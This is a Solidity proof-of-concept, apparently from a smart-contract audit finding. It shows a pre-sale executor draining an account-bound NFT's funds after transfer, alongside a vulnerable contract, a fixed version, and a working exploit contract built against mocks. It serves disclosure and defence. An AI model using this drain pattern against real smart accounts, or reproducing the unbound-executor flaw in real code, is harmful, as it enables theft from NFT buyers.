// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Molecule OnChainLab — executeFromExecutor survives an NFT sale
    (Cyfrin, 2026-05). installModule does not bump state, and
    executeFromExecutor does not bind the executor to the NFT owner.
    The seller installs a drain executor, the buyer sees an unchanged
    state, and the seller pulls the account's 5 ETH after the transfer.
    The control bumps state and refuses the executor once the owner changes.
*/

contract Asset {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OnChainLab {
    uint256 public constant MODULE_TYPE_EXECUTOR = 2;
    uint256 public state = 5;
    address public nftOwner;
    Asset public asset;
    mapping(address => bool) public executorInstalled;

    constructor(Asset _asset, address owner) {
        asset = _asset;
        nftOwner = owner;
    }

    function installModule(uint256 moduleType, address module, bytes calldata) external {
        require(moduleType == MODULE_TYPE_EXECUTOR, "type");
        require(msg.sender == nftOwner, "owner");
        executorInstalled[module] = true;
    }

    function transferNft(address buyer) external {
        require(msg.sender == nftOwner, "owner");
        nftOwner = buyer;
    }

    function executeFromExecutor(address to, uint256 value, bytes calldata) external {
        require(executorInstalled[msg.sender], "not executor");
        // @> VULN: executeFromExecutor does not bump state and does not check the NFT owner, so a pre-listing executor still drains
        asset.transfer(to, value);
    }
}

contract OnChainLabFixed {
    uint256 public constant MODULE_TYPE_EXECUTOR = 2;
    uint256 public state = 5;
    address public nftOwner;
    Asset public asset;
    mapping(address => bool) public executorInstalled;
    mapping(address => address) public installerOf;

    constructor(Asset _asset, address owner) {
        asset = _asset;
        nftOwner = owner;
    }

    function installModule(uint256 moduleType, address module, bytes calldata) external {
        require(moduleType == MODULE_TYPE_EXECUTOR, "type");
        require(msg.sender == nftOwner, "owner");
        state++;
        executorInstalled[module] = true;
        installerOf[module] = msg.sender;
    }

    function transferNft(address buyer) external {
        require(msg.sender == nftOwner, "owner");
        nftOwner = buyer;
    }

    function executeFromExecutor(address to, uint256 value, bytes calldata) external {
        require(executorInstalled[msg.sender], "not executor");
        require(nftOwner == installerOf[msg.sender], "owner changed");
        state++;
        asset.transfer(to, value);
    }
}

contract MaliciousExecutor {
    function sudoDoExec(OnChainLab ocl, address sink, uint256 amount) external {
        ocl.executeFromExecutor(sink, amount, bytes(""));
    }

    function sudoDoExecFixed(OnChainLabFixed ocl, address sink, uint256 amount) external {
        ocl.executeFromExecutor(sink, amount, bytes(""));
    }
}

contract Exploit {
    address public constant BUYER = address(uint160(0xB00));
    uint256 public constant BALANCE = 5 ether;

    Asset public asset;
    OnChainLab public ocl;
    MaliciousExecutor public executor;
    uint256 public listedState;
    uint256 public stateAfterInstall;
    uint256 public stateAfterSale;
    uint256 public stateAfterDrain;

    constructor() {
        asset = new Asset();
        executor = new MaliciousExecutor();
        ocl = new OnChainLab(asset, address(this));
    }

    function run() external {
        listedState = ocl.state();
        asset.mint(address(ocl), BALANCE);
        ocl.installModule(ocl.MODULE_TYPE_EXECUTOR(), address(executor), bytes(""));
        stateAfterInstall = ocl.state();
        ocl.transferNft(BUYER);
        stateAfterSale = ocl.state();
        executor.sudoDoExec(ocl, address(this), BALANCE);
        stateAfterDrain = ocl.state();
        require(stateAfterInstall == listedState, "install state");
        require(ocl.nftOwner() == BUYER, "buyer");
        require(stateAfterSale == listedState, "sale state");
        require(stateAfterDrain == listedState, "drain state");
        require(asset.balanceOf(address(ocl)) == 0, "emptied");
        require(asset.balanceOf(address(this)) == BALANCE, "stolen");
    }
}
